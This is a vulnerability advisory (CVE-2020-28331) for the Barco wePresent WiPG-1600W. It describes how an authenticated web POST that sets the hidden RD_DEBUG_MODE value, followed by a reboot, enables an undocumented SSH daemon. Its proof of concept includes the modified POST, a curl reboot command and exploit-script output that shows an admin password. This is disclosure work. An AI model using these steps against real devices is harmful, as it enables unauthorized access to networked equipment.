KL-001-2020-007 : Barco wePresent Undocumented SSH Interface Accessible Via Web UI
Title: Barco wePresent Undocumented SSH Interface Accessible Via Web UI
Advisory ID: KL-001-2020-007
Publication Date: 2020.11.20
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2020-007.txt
1. Vulnerability Details
Affected Vendor: Barco
Affected Product: wePresent WiPG-1600W
Affected Version: 2.5.1.8
Platform: Embedded Linux
CWE Classification: CWE-284: Improper Access Control
CVE ID: CVE-2020-28331
2. Vulnerability Description
The Barco wePresent device has an SSH daemon included in the
firmware image. By default, the SSH daemon is disabled and does
not start at system boot. The system initialization scripts read
a device configuration file variable to see if the SSH daemon
should be started. The web interface does not provide a visible
capability to alter this configuration file variable. However,
a malicious actor can include this variable in a POST such
that the SSH daemon will be started when the device boots.
3. Technical Description
The Barco wePresent web UI does not appear to have configuration
options/settings for enabling the SSH service or configuring
system-level accounts on the device. The device does
not have a SSH daemon listening by default. In looking at
the unpacked firmware, there is an SSH daemon init script
(/etc/init.d/S41ssh). The init script starts the SSH daemon
only if a specific value from the device's configuration is
set to "1". Excerpts from the init script:
mode=$(/mnt/AwGetCfg get RD\_DEBUG\_MODE)
runprocess() {
if [ "$mode" = "1" ]; then
echo "dropbear running" /usr/bin/dropbear
fi
}
The AwGetCfg binry reads the /etc/content/AwDefault.xml file,
and there is a RD\_DEBUG\_MODE value set in that file. By default
RD\_DEBUG\_MODE is set to "0" in the firmware.
While the web pages in the web UI do not have apparent ways
to enable SSH, other configuration settings that appear in
the /etc/content/AwDefault.xml file can be modified by the web
UI. So, a configuration change originating from the UI can be
intercepted and modified to set RD\_DEBUG\_MODE to 1.
Many (all?) configuration changes to the device require a reboot
to take effect. So, another POST has to be sent, using the
"SEID" to reboot the device. After the device comes back up,
the SSH service is indeed running and accepting connections.
The root user is the only system level user that is present
in the firmware by default. A hash for the root account is
present in the /etc/shadow file, but has been resistant to
being cracked thus far.
4. Mitigation and Remediation Recommendation
The vendor has released an updated firmware (2.5.3.12) which
remediates the described vulnerability. Firmware and release
notes are available at:

7. Proof of Concept
$ nmap 192.168.2.200
Nmap scan report for 192.168.2.200

To enable SSH service, authenticate to the wePresent
device and click apply (does not even have to be
an actual configuration change). In the POST add
"RD\_DEBUG\_MODE1"
POST /cgi-bin/return.cgi HTTP/1.1
Host: 192.168.2.200

And then issue a reboot to the device:
$ curl -k -X POST https://192.168.2.200/cgi-bin/return.cgi -d 'command=rjviSfqdmPuWrZ7zreboot'
RebootOK
The above steps can be captured in a Python script
(a different SEID was generated by the device):
user@machine:~/wepresent$ ./WePwn.py -h 192.168.2.200
[+] Admin password is: W3Pr3s3nt

[+] Enabling SSH Daemon
[+] Rebooting device
[+] Waiting for 60 seconds while device reboots
10...20...30...40...50...60
After the device reboots, the SSH daemon is now running and
listening on port 22/tcp.
